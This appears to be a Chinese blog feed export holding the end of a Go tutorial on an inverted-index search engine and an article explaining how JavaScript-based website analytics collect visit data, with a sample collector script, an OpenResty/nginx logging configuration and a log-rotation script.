<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">map</span>[donut:[<span class="number">1</span> <span class="number">2</span>] glass:[<span class="number">1</span>] is:[<span class="number">2</span>] on:[<span class="number">1</span>] only:[<span class="number">1</span>] plate:[<span class="number">1</span>]]</span><br></pre></td></tr></table></figure>

<h3 id="索引检索"><a href="#索引检索" class="headerlink" title="索引检索"></a>索引检索</h3><p>要查询索引，我们将应用用于索引的相同标记器和过滤器：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(idx index)</span> <span class="title">search</span><span class="params">(text <span class="keyword">string</span>)</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> r [][]<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> _, token := <span class="keyword">range</span> analyze(text) &#123;</span><br><span class="line">        <span class="keyword">if</span> ids, ok := idx[token]; ok &#123;</span><br><span class="line">            r = <span class="built_in">append</span>(r, ids)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&gt; idx.search(<span class="string">"Small wild cat"</span>)</span><br><span class="line"></span><br><span class="line">[[<span class="number">24</span>, <span class="number">173</span>, <span class="number">303</span>, ...], [<span class="number">98</span>, <span class="number">173</span>, <span class="number">765</span>, ...], [[<span class="number">24</span>, <span class="number">51</span>, <span class="number">173</span>, ...]]</span><br></pre></td></tr></table></figure>

<p>最后，我们可以找到所有提到猫的文件。搜索60万个文档所用时间不到1毫秒（18微秒）！</p>
<p>使用反向索引时，搜索查询的时间复杂度与搜索词的数量成线性关系。在上面的示例查询中，除了分析输入文本外，search只需执行三次map查找。</p>
<h3 id="Boolean检索"><a href="#Boolean检索" class="headerlink" title="Boolean检索"></a>Boolean检索</h3><p>上一节中的查询为每个令牌返回一个分离的文档列表。当我们在搜索框中输入small wild cat时，我们通常期望找到的是同时包含small、wild和cat的结果列表。下一步是计算列表之间的集合交集。这样我们将得到一个匹配所有令牌的文档列表。</p>
<p><img src="/articles/实现一个简单的全文检索引擎/venn.png" alt></p>
<p>幸运的是，反向索引中的id是按升序插入的。由于ID是排序的，所以可以在线性时间内计算两个列表之间的交集。intersection函数同时迭代两个列表，并收集两个列表中存在的ID：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">intersection</span><span class="params">(a []<span class="keyword">int</span>, b []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    maxLen := <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b) &gt; maxLen &#123;</span><br><span class="line">        maxLen = <span class="built_in">len</span>(b)</span><br><span class="line">    &#125;</span><br><span class="line">    r := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>, maxLen)</span><br><span class="line">    <span class="keyword">var</span> i, j <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> i &lt; <span class="built_in">len</span>(a) &amp;&amp; j &lt; <span class="built_in">len</span>(b) &#123;</span><br><span class="line">        <span class="keyword">if</span> a[i] &lt; b[j] &#123;</span><br><span class="line">            i++</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> a[i] &gt; b[j] &#123;</span><br><span class="line">            j++</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r = <span class="built_in">append</span>(r, a[i])</span><br><span class="line">            i++</span><br><span class="line">            j++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更新的文本分析给定的查询文本、查找标记并计算ID列表之间的集合交集：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(idx index)</span> <span class="title">search</span><span class="params">(text <span class="keyword">string</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> r []<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> _, token := <span class="keyword">range</span> analyze(text) &#123;</span><br><span class="line">        <span class="keyword">if</span> ids, ok := idx[token]; ok &#123;</span><br><span class="line">            <span class="keyword">if</span> r == <span class="literal">nil</span> &#123;</span><br><span class="line">                r = ids</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r = intersection(r, ids)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Token doesn't exist.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wikipedia dump 同时包含匹配 small、wild和cat的两个文档：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&gt; idx.search(<span class="string">"Small wild cat"</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">130764</span>  The wildcat is a species <span class="built_in">complex</span> comprising two small wild cat species, the European wildcat (Felis silvestris) and the African wildcat (F. lybica).</span><br><span class="line"><span class="number">131692</span>  Catopuma is a genus containing two Asian small wild cat species, the Asian golden cat (C. temminckii) and the bay cat.</span><br></pre></td></tr></table></figure>

<p>搜索顺利完成。  </p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们刚刚建立了一个全文搜索引擎。尽管它简单，它可以为更先进的项目奠定坚实的基础。</p>
<p>文中没有提到很多可以显著提高性能和使搜索引擎更人性化的东西。以下是一些进一步改进的想法：</p>
<ul>
<li><p>扩展布尔查询以支持 <em>OR</em> 和 <em>NOT</em> ;</p>
</li>
<li><p>在磁盘上存储索引：</p>
<ul>
<li><p>每次重新启动应用程序时重建索引可能需要一段时间;</p>
</li>
<li><p>大索引可能无法放入内存;</p>
</li>
</ul>
</li>
<li><p>尝试使用内存和CPU高效的数据格式来存储文档ID集;</p>
</li>
<li><p>支持索引多个文档字段;</p>
</li>
<li><p>按相关性对结果排序;</p>
</li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://artem.krylysov.com/blog/2020/07/28/lets-build-a-full-text-search-engine/" target="_blank" rel="noopener">lets-build-a-full-text-search-engine - krylysov </a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>网站统计中的数据收集原理及实现</title>
    <url>/articles/%E7%BD%91%E7%AB%99%E7%BB%9F%E8%AE%A1%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>网站数据统计分析工具是网站站长和运营人员经常使用的一种工具，比较常用的有谷歌分析、百度统计和<br>腾讯分析等等。所有这些统计分析工具的第一步都是网站访问数据的收集。目前主流的数据收集方式基本都是基于javascript的。本文将简要分析这种数据收集的原理，并一步一步实际搭建一个实际的数据收集系统。</p>
<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>简单来说，网站统计分析工具需要收集到用户浏览目标网站的行为（如打开某网页、点击某按钮、将商品加入购物车等）及行为附加数据（如某下单行为产生的订单金额等）。早期的网站统计往往只收集一种用户行为：页面的打开。而后用户在页面中的行为均无法收集。这种收集策略能满足基本的流量分析、来源分析、内容分析及访客属性等常用分析视角，但是，随着ajax技术的广泛使用及电子商务网站对于电子商务目标的统计分析的需求越来越强烈，这种传统的收集策略已经显得力不能及。</p>
<p>后来，Google在其产品谷歌分析中创新性的引入了可定制的数据收集脚本，用户通过谷歌分析定义好的可扩展接口，只需编写少量的javascript代码就可以实现自定义事件和自定义指标的跟踪和分析。目前百度统计、搜狗分析等产品均照搬了谷歌分析的模式。</p>
<p>其实说起来两种数据收集模式的基本原理和流程是一致的，只是后一种通过javascript收集到了更多的信息。下面看一下现在各种网站统计工具的数据收集基本原理。</p>
<h3 id="流程概览"><a href="#流程概览" class="headerlink" title="流程概览"></a>流程概览</h3><p>首先通过一幅图总体看一下数据收集的基本流程。</p>
<p><img src="/articles/网站统计中的数据收集原理及实现/0.png" alt="网站统计数据收集基本流程"></p>
<p>首先，用户的行为会触发浏览器对被统计页面的一个http请求，这里姑且先认为行为就是打开网页。当网页被打开，页面中的埋点javascript片段会被执行，用过相关工具的朋友应该知道，一般网站统计工具都会要求用户在网页中加入一小段javascript代码，这个代码片段一般会动态创建一个script标签，并将src指向一个单独的js文件，此时这个单独的js文件（图1中绿色节点）会被浏览器请求到并执行，这个js往往就是真正的数据收集脚本。数据收集完成后，js会请求一个后端的数据收集脚本（图1中的backend），这个脚本一般是一个伪装成图片的动态脚本程序，可能由php、python或其它服务端语言编写，js会将收集到的数据通过http参数的方式传递给后端脚本，后端脚本解析参数并按固定格式记录到访问日志，同时可能会在http响应中给客户端种植一些用于追踪的cookie。</p>
<p>上面是一个数据收集的大概流程，下面以谷歌分析为例，对每一个阶段进行一个相对详细的分析。</p>
<h4 id="埋点脚本执行阶段"><a href="#埋点脚本执行阶段" class="headerlink" title="埋点脚本执行阶段"></a>埋点脚本执行阶段</h4><p>若要使用谷歌分析（以下简称GA），需要在页面中插入一段它提供的javascript片段，这个片段往往被称为埋点代码。下面是我的博客中所放置的谷歌分析埋点代码截图：</p>
<p><img src="/articles/网站统计中的数据收集原理及实现/1.png" alt="谷歌分析埋点代码"></p>
<p>其中_gaq是GA的的全局数组，用于放置各种配置，其中每一条配置的格式为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">_gaq.push([<span class="string">'Action'</span>, <span class="string">'param1'</span>, <span class="string">'param2'</span>, ...]);</span><br></pre></td></tr></table></figure>

<p>Action指定配置动作，后面是相关的参数列表。GA给的默认埋点代码会给出两条预置配置，_setAccount用于设置网站标识ID，这个标识ID是在注册GA时分配的。_trackPageview告诉GA跟踪一次页面访问。更多配置请参考：<a href="https://developers.google.com/analytics/devguides/collection/gajs" target="_blank" rel="noopener">https://developers.google.com/analytics/devguides/collection/gajs/</a>。实际上，这个_gaq是被当做一个FIFO队列来用的，配置代码不必出现在埋点代码之前，具体请参考上述链接的说明。</p>
<p>就本文来说，_gaq的机制不是重点，重点是后面匿名函数的代码，这才是埋点代码真正要做的。这段代码的主要目的就是引入一个外部的js文件（ga.js），方式是通过document.createElement方法创建一个script并根据协议（http或https）将src指向对应的ga.js，最后将这个element插入页面的dom树上。</p>
<p>注意ga.async = true的意思是异步调用外部js文件，即不阻塞浏览器的解析，待外部js下载完成后异步执行。这个属性是HTML5新引入的。</p>
<h4 id="数据收集脚本执行阶段"><a href="#数据收集脚本执行阶段" class="headerlink" title="数据收集脚本执行阶段"></a>数据收集脚本执行阶段</h4><p>数据收集脚本（ga.js）被请求后会被执行，这个脚本一般要做如下几件事：</p>
<ul>
<li><p>通过浏览器内置javascript对象收集信息，如页面title（通过document.title）、referrer（上一跳url，通过document.referrer）、用户显示器分辨率（通过windows.screen）、cookie信息（通过document.cookie）等等一些信息。</p>
</li>
<li><p>解析_gaq收集配置信息。这里面可能会包括用户自定义的事件跟踪、业务数据（如电子商务网站的商品编号等）等。</p>
</li>
<li><p>上面两步收集的数据按预定义格式解析并拼接。</p>
</li>
<li><p>请求一个后端脚本，将信息放在http request参数中携带给后端脚本。</p>
</li>
</ul>
<p>这里唯一的问题是步骤4，javascript请求后端脚本常用的方法是ajax，但是ajax是不能跨域请求的。这里ga.js在被统计网站的域内执行，而后端脚本在另外的域（GA的后端统计脚本是<a href="http://www.google-analytics.com/__utm.gif" target="_blank" rel="noopener">http://www.google-analytics.com/__utm.gif</a>，ajax行不通。一种通用的方法是js脚本创建一个Image对象，将Image对象的src属性指向后端脚本并携带参数，此时即实现了跨域请求后端。这也是后端脚本为什么通常伪装成gif文件的原因。通过http抓包可以看到ga.js对__utm.gif的请求：</p>
<p><img src="/articles/网站统计中的数据收集原理及实现/2.png" alt="后端脚本请求的http包"> </p>
<p>可以看到ga.js在请求__utm.gif时带了很多信息，例如utmsr=1280×1024是屏幕分辨率，utmac=UA-35712773-1是_gaq中解析出的我的GA标识ID等等。</p>
<p>值得注意的是，__utm.gif未必只会在埋点代码执行时被请求，如果用_trackEvent配置了事件跟踪，则在事件发生时也会请求这个脚本。</p>
<p>由于ga.js经过了压缩和混淆，可读性很差，我们就不分析了，具体后面实现阶段我会实现一个功能类似的脚本。</p>
<p>后端脚本执行阶段</p>
<p>GA的__utm.gif是一个伪装成gif的脚本。这种后端脚本一般要完成以下几件事情：</p>
<ul>
<li><p>解析http请求参数的到信息。</p>
</li>
<li><p>从服务器（WebServer）中获取一些客户端无法获取的信息，如访客ip等。</p>
</li>
<li><p>将信息按格式写入log。</p>
</li>
<li><p>生成一副1×1的空gif图片作为响应内容并将响应头的Content-type设为image/gif。</p>
</li>
<li><p>在响应头中通过Set-cookie设置一些需要的cookie信息。</p>
</li>
</ul>
<p>之所以要设置cookie是因为如果要跟踪唯一访客，通常做法是如果在请求时发现客户端没有指定的跟踪cookie，则根据规则生成一个全局唯一的cookie并种植给用户，否则Set-cookie中放置获取到的跟踪cookie以保持同一用户cookie不变（见图4）。</p>
<p><img src="/articles/网站统计中的数据收集原理及实现/3.png" alt="通过cookie跟踪唯一用户的原理"> </p>
<p>这种做法虽然不是完美的（例如用户清掉cookie或更换浏览器会被认为是两个用户），但是是目前被广泛使用的手段。注意，如果没有跨站跟踪同一用户的需求，可以通过js将cookie种植在被统计站点的域下（GA是这么做的），如果要全网统一定位，则通过后端脚本种植在服务端域下（我们待会的实现会这么做）。</p>
<h3 id="系统的设计实现"><a href="#系统的设计实现" class="headerlink" title="系统的设计实现"></a>系统的设计实现</h3><p>根据上述原理，我自己搭建了一个访问日志收集系统。总体来说，搭建这个系统要做如下的事：</p>
<p><img src="/articles/网站统计中的数据收集原理及实现/4.png" alt="访问数据收集系统工作分解"></p>
<p>下面详述每一步的实现。我将这个系统叫做MyAnalytics。</p>
<h4 id="确定收集的信息"><a href="#确定收集的信息" class="headerlink" title="确定收集的信息"></a>确定收集的信息</h4><p>为了简单起见，我不打算实现GA的完整数据收集模型，而是收集以下信息。</p>
<table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">途径</th>
<th align="left">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="left">访问时间</td>
<td align="left">web server</td>
<td align="left">Nginx $msec</td>
</tr>
<tr>
<td align="left">IP</td>
<td align="left">web server</td>
<td align="left">Nginx $remote_addr</td>
</tr>
<tr>
<td align="left">域名</td>
<td align="left">javascript</td>
<td align="left">document.domain</td>
</tr>
<tr>
<td align="left">URL</td>
<td align="left">javascript</td>
<td align="left">document.URL</td>
</tr>
<tr>
<td align="left">页面标题</td>
<td align="left">javascript</td>
<td align="left">document.title</td>
</tr>
<tr>
<td align="left">分辨率</td>
<td align="left">javascript</td>
<td align="left">window.screen.height &amp; width</td>
</tr>
<tr>
<td align="left">颜色深度</td>
<td align="left">javascript</td>
<td align="left">window.screen.colorDepth</td>
</tr>
<tr>
<td align="left">Referrer</td>
<td align="left">javascript</td>
<td align="left">document.referrer</td>
</tr>
<tr>
<td align="left">浏览客户端</td>
<td align="left">web server</td>
<td align="left">Nginx $http_user_agent</td>
</tr>
<tr>
<td align="left">客户端语言</td>
<td align="left">javascript</td>
<td align="left">navigator.language</td>
</tr>
<tr>
<td align="left">访客标识</td>
<td align="left">cookie</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">网站标识</td>
<td align="left">javascript</td>
<td align="left">自定义对象</td>
</tr>
</tbody></table>
<h4 id="埋点代码"><a href="#埋点代码" class="headerlink" title="埋点代码"></a>埋点代码</h4><p>埋点代码我将借鉴GA的模式，但是目前不会将配置对象作为一个FIFO队列用。一个埋点代码的模板如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _maq = _maq || [];</span><br><span class="line"></span><br><span class="line">_maq.push([<span class="string">'_setAccount'</span>, <span class="string">'网站标识'</span>]);</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> ma = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>); </span><br><span class="line">    ma.type = <span class="string">'text/javascript'</span>; </span><br><span class="line">    ma.async = <span class="literal">true</span>;</span><br><span class="line">    ma.src = (<span class="string">'https:'</span> == <span class="built_in">document</span>.location.protocol ? <span class="string">'https://analytics'</span>:<span class="string">'http://analytics)'</span>) + <span class="string">'.codinglabs.org/ma.js'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'script'</span>)[<span class="number">0</span>]; </span><br><span class="line">    s.parentNode.insertBefore(ma, s);</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我启用了二级域名analytics.codinglabs.org，统计脚本的名称为ma.js。当然这里有一点小问题，因为我并没有https的服务器，所以如果一个https站点部署了代码会有问题，不过这里我们先忽略吧。</p>
<h4 id="前端统计脚本"><a href="#前端统计脚本" class="headerlink" title="前端统计脚本"></a>前端统计脚本</h4><p>我写了一个不是很完善但能完成基本工作的统计脚本ma.js：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> params = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Document对象数据</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">document</span>) &#123;</span><br><span class="line"></span><br><span class="line">        params.domain = <span class="built_in">document</span>.domain || <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        params.url = <span class="built_in">document</span>.URL || <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        params.title = <span class="built_in">document</span>.title || <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        params.referrer = <span class="built_in">document</span>.referrer || <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Window对象数据</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span> &amp;&amp; <span class="built_in">window</span>.screen) &#123;</span><br><span class="line"></span><br><span class="line">        params.sh = <span class="built_in">window</span>.screen.height || <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        params.sw = <span class="built_in">window</span>.screen.width || <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        params.cd = <span class="built_in">window</span>.screen.colorDepth || <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//navigator对象数据</span></span><br><span class="line">    <span class="keyword">if</span> (navigator) &#123;</span><br><span class="line"></span><br><span class="line">        params.lang = navigator.language || <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//解析_maq配置</span></span><br><span class="line">    <span class="keyword">if</span> (_maq) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> _maq) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (_maq[i][<span class="number">0</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'_setAccount'</span>:</span><br><span class="line"></span><br><span class="line">                params.account = _maq[i][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//拼接参数串</span></span><br><span class="line">    <span class="keyword">var</span> args = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> params) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (args != <span class="string">''</span>) &#123;</span><br><span class="line"></span><br><span class="line">            args += <span class="string">'&amp;'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        args += i + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(params[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过Image对象请求后端脚本</span></span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> Image(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    img.src = <span class="string">'http://analytics.codinglabs.org/1.gif?'</span> + args;</span><br><span class="line"></span><br><span class="line">&#125;)();<span class="string">'</span></span><br></pre></td></tr></table></figure>

<p>整个脚本放在匿名函数里，确保不会污染全局环境。功能在原理一节已经说明，不再赘述。其中1.gif是后端脚本。</p>
<h4 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h4><p>日志采用每行一条记录的方式，采用不可见字符^A（ascii码0×01，Linux下可通过ctrl + v ctrl + a输入，下文均用“^A”表示不可见字符0×01），具体格式如下：</p>
<p>时间^AIP^A域名^AURL^A页面标题^AReferrer^A分辨率高^A分辨率宽^A颜色深度^A语言^A客户端信息^A用户标识^A网站标识</p>
<h4 id="后端脚本"><a href="#后端脚本" class="headerlink" title="后端脚本"></a>后端脚本</h4><p>为了简单和效率考虑，我打算直接使用nginx的access_log做日志收集，不过有个问题就是nginx配置本身的逻辑表达能力有限，所以我选用了<a href="http://openresty.org/cn/" target="_blank" rel="noopener">OpenResty</a>做这个事情。OpenResty是一个基于Nginx扩展出的高性能应用开发平台，内部集成了诸多有用的模块，其中的核心是通过ngx_lua模块集成了Lua，从而在nginx配置文件中可以通过Lua来表述业务。关于这个平台我这里不做过多介绍，感兴趣的同学可以参考其官方网站<a href="http://openresty.org/" target="_blank" rel="noopener">http://openresty.org/</a>，或者这里有其作者章亦春（agentzh）做的一个非常有爱的介绍OpenResty的slide：<a href="http://agentzh.org/misc/slides/ngx-openresty-ecosystem/" target="_blank" rel="noopener">http://agentzh.org/misc/slides/ngx-openresty-ecosystem/</a>，关于ngx_lua可以参考：<a href="https://github.com/chaoslawful/lua-nginx-module" target="_blank" rel="noopener">https://github.com/chaoslawful/lua-nginx-module</a>。</p>
<p>首先，需要在nginx的配置文件中定义日志格式：</p>
<pre><code>log_format tick &quot;$msec^A$remote_addr^A$u_domain^A$u_url^A$u_title^A$u_referrer^A$u_sh^A$u_sw^A$u_cd^A$u_lang^A$http_user_agent^A$u_utrace^A$u_account&quot;;</code></pre><p>注意这里以u_开头的是我们待会会自己定义的变量，其它的是nginx内置变量。</p>
<p>然后是核心的两个location：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">location /1.gif &#123;</span><br><span class="line">    <span class="comment">#伪装成gif文件</span></span><br><span class="line">    default_type image/gif;</span><br><span class="line">    <span class="comment">#本身关闭access_log，通过subrequest记录log</span></span><br><span class="line">    access_log off;</span><br><span class="line"></span><br><span class="line">    access_by_lua <span class="string">"</span></span><br><span class="line"><span class="string">    -- 用户跟踪cookie名为__utrace</span></span><br><span class="line"><span class="string">    local uid = ngx.var.cookie___utrace</span></span><br><span class="line"><span class="string">    if not uid then</span></span><br><span class="line"><span class="string">    -- 如果没有则生成一个跟踪cookie，算法为md5(时间戳+IP+客户端信息)</span></span><br><span class="line"><span class="string">    uid = ngx.md5(ngx.now() .. ngx.var.remote_addr .. ngx.var.http_user_agent)</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">    ngx.header['Set-Cookie'] = &#123;'__utrace=' .. uid .. '; path=/'&#125;</span></span><br><span class="line"><span class="string">    if ngx.var.arg_domain then</span></span><br><span class="line"><span class="string">    -- 通过subrequest到/i-log记录日志，将参数和用户跟踪cookie带过去</span></span><br><span class="line"><span class="string">    ngx.location.capture('/i-log?' .. ngx.var.args .. '&amp;utrace=' .. uid)</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">    "</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#此请求不缓存</span></span><br><span class="line">    add_header Expires <span class="string">"Fri, 01 Jan 1980 00:00:00 GMT"</span>;</span><br><span class="line">    add_header Pragma <span class="string">"no-cache"</span>;</span><br><span class="line">    add_header Cache-Control <span class="string">"no-cache, max-age=0, must-revalidate"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#返回一个1×1的空gif图片</span></span><br><span class="line">    empty_gif;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /i-log &#123;</span><br><span class="line">    <span class="comment">#内部location，不允许外部直接访问</span></span><br><span class="line">    internal;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#设置变量，注意需要unescape</span></span><br><span class="line">    set_unescape_uri <span class="variable">$u_domain</span> <span class="variable">$arg_domain</span>;</span><br><span class="line">    set_unescape_uri <span class="variable">$u_url</span> <span class="variable">$arg_url</span>;</span><br><span class="line">    set_unescape_uri <span class="variable">$u_title</span> <span class="variable">$arg_title</span>;</span><br><span class="line">    set_unescape_uri <span class="variable">$u_referrer</span> <span class="variable">$arg_referrer</span>;</span><br><span class="line">    set_unescape_uri <span class="variable">$u_sh</span> <span class="variable">$arg_sh</span>;</span><br><span class="line">    set_unescape_uri <span class="variable">$u_sw</span> <span class="variable">$arg_sw</span>;</span><br><span class="line">    set_unescape_uri <span class="variable">$u_cd</span> <span class="variable">$arg_cd</span>;</span><br><span class="line">    set_unescape_uri <span class="variable">$u_lang</span> <span class="variable">$arg_lang</span>;</span><br><span class="line">    set_unescape_uri <span class="variable">$u_utrace</span> <span class="variable">$arg_utrace</span>;</span><br><span class="line">    set_unescape_uri <span class="variable">$u_account</span> <span class="variable">$arg_account</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#打开日志</span></span><br><span class="line">    log_subrequest on;</span><br><span class="line">    <span class="comment">#记录日志到ma.log，实际应用中最好加buffer，格式为tick</span></span><br><span class="line">    access_log /path/to/logs/directory/ma.log tick;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#输出空字符串</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要完全解释这段脚本的每一个细节有点超出本文的范围，而且用到了诸多第三方ngxin模块（全都包含在OpenResty中了），重点的地方我都用注释标出来了，可以不用完全理解每一行的意义，只要大约知道这个配置完成了我们在原理一节提到的后端逻辑就可以了。</p>
<h4 id="日志轮转"><a href="#日志轮转" class="headerlink" title="日志轮转"></a>日志轮转</h4><p>真正的日志收集系统访问日志会非常多，时间一长文件变得很大，而且日志放在一个文件不便于管理。所以通常要按时间段将日志切分，例如每天或每小时切分一个日志。我这里为了效果明显，每一小时切分一个日志。我是通过crontab定时调用一个shell脚本实现的，shell脚本如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">_prefix=<span class="string">"/path/to/nginx"</span></span><br><span class="line">time=`date +%Y%m%d%H`</span><br><span class="line"> </span><br><span class="line">mv <span class="variable">$&#123;_prefix&#125;</span>/logs/ma.log <span class="variable">$&#123;_prefix&#125;</span>/logs/ma/ma-<span class="variable">$&#123;time&#125;</span>.<span class="built_in">log</span></span><br><span class="line"><span class="built_in">kill</span> -USR1 `cat <span class="variable">$&#123;_prefix&#125;</span>/logs/nginx.pid`</span><br></pre></td></tr></table></figure>

<p>这个脚本将ma.log移动到指定文件夹并重命名为ma-{yyyymmddhh}.log，然后向nginx发送USR1信号令其重新打开日志文件。</p>
<p>然后再/etc/crontab里加入一行：</p>
<pre><code>59  *  *  *  * root /path/to/directory/rotatelog.sh</code></pre><p>在每个小时的59分启动这个脚本进行日志轮转操作。</p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>下面可以测试这个系统是否能正常运行了。我昨天就在我的博客中埋了相关的点，通过http抓包可以看到ma.js和1.gif已经被正确请求：</p>
<p><img src="/articles/网站统计中的数据收集原理及实现/5.png" alt="http包分析ma.js和1.gif的请求"></p>
<p>同时可以看一下1.gif的请求参数：</p>
<p><img src="/articles/网站统计中的数据收集原理及实现/6.png" alt="gif的请求参数"> </p>
<p>相关信息确实也放在了请求参数中。</p>
<p>然后我tail打开日志文件，然后刷新一下页面，因为没有设access log buffer， 我立即得到了一条新日志：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1351060731.360^A0.0.0.0^Awww.codinglabs.org^Ahttp://www.codinglabs.org/</span><br><span class="line">^ACodingLabs^A^A1024^A1280^A24^Azh-CN^AMozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4^A4d612be64366768d32e623d594e82678^AU-1-1</span><br></pre></td></tr></table></figure>

<p>注意实际上原日志中的^A是不可见的，这里我用可见的^A替换为方便阅读，另外IP由于涉及隐私我替换为了0.0.0.0。</p>
